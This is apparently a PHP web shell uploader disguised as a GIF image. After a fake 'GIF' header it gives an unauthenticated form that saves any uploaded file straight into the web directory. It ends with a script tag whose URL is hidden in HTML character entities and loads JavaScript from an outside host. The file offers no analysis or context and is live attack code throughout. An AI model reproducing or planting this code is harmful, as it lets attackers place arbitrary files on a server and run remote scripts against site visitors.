GIF
<?php
if(isset($_POST['Submit'])){
    $filedir = "";
    $maxfile = '2000000';
 
    $userfile_name = $_FILES['image']['name'];
    $userfile_tmp = $_FILES['image']['tmp_name'];
    if (isset($_FILES['image']['name'])) {
        $abod = $filedir.$userfile_name;
        @move_uploaded_file($userfile_tmp, $abod);
 
echo"<center><b>Done ==> $userfile_name</b></center>";
}
}
else{
echo'
<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>';
}
?>
<SCRIPT SRC=&#x68&#x74&#x74&#x70&#x3a&#x2f&#x2f&#x77&#x77&#x77&#x2e&#x6c&#x6f&#x63&#x61&#x6c&#x72&#x6f&#x6f&#x74&#x2e&#x6e&#x65&#x74&#x2f&#x69&#x62&#x6e&#x65&#x6c&#x65&#x72&#x2f&#x79&#x61&#x7a&#x2e&#x6a&#x73></SCRIPT> 